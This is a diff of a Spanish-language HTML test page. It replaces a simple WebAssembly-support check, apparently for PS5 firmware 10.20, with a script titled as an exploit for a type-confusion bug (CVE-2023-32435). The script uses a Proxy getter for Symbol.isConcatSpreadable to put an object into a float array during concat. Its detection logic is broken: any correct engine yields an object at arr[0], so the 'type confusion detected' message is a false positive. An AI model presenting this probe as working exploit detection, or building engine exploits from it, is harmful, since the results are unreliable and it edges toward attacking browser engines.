@@ -2,33 +2,48 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Test WebAssembly PS5 FW 10.20</title>
+  <title>Exploit Type Confusion (CVE-2023-32435)</title>
   <style>
     body {
       background-color: #111;
       color: #0f0;
       font-family: monospace;
-      text-align: center;
-      padding-top: 5em;
-    }
-    #resultado {
-      color: yellow;
-      font-size: 1.5em;
-      margin-top: 2em;
+      padding: 2em;
     }
   </style>
 </head>
 <body>
-  <h1>¿Está habilitado WebAssembly?</h1>
-  <p>Detectando soporte...</p>
-  <div id="resultado">...</div>
-
+  <h1>Test Type Confusion (sin WebAssembly)</h1>
+  <div id="status">Ejecutando...</div>
   <script>
-    const soporte = typeof WebAssembly;
-    document.getElementById("resultado").textContent = 
-      soporte === "object"
-        ? "✅ WebAssembly está HABILITADO"
-        : "❌ WebAssembly está DESHABILITADO";
+    function log(msg) {
+      document.getElementById("status").textContent = msg;
+      console.log(msg);
+    }
+
+    try {
+      let victim = [1.1, 2.2, 3.3];
+      let container = {obj: victim};
+      let handler = {
+        get: function(target, prop) {
+          if (prop === Symbol.isConcatSpreadable) {
+            victim[0] = {};
+            return true;
+          }
+          return target[prop];
+        }
+      };
+      let proxy = new Proxy([], handler);
+      let arr = [].concat(proxy, victim);
+
+      if (typeof arr[0] === "object") {
+        log("✅ POSIBLE CONFUSIÓN DE TIPO DETECTADA");
+      } else {
+        log("❌ No se produjo type confusion");
+      }
+    } catch (e) {
+      log("❌ Error en ejecución: " + e);
+    }
   </script>
 </body>
 </html>
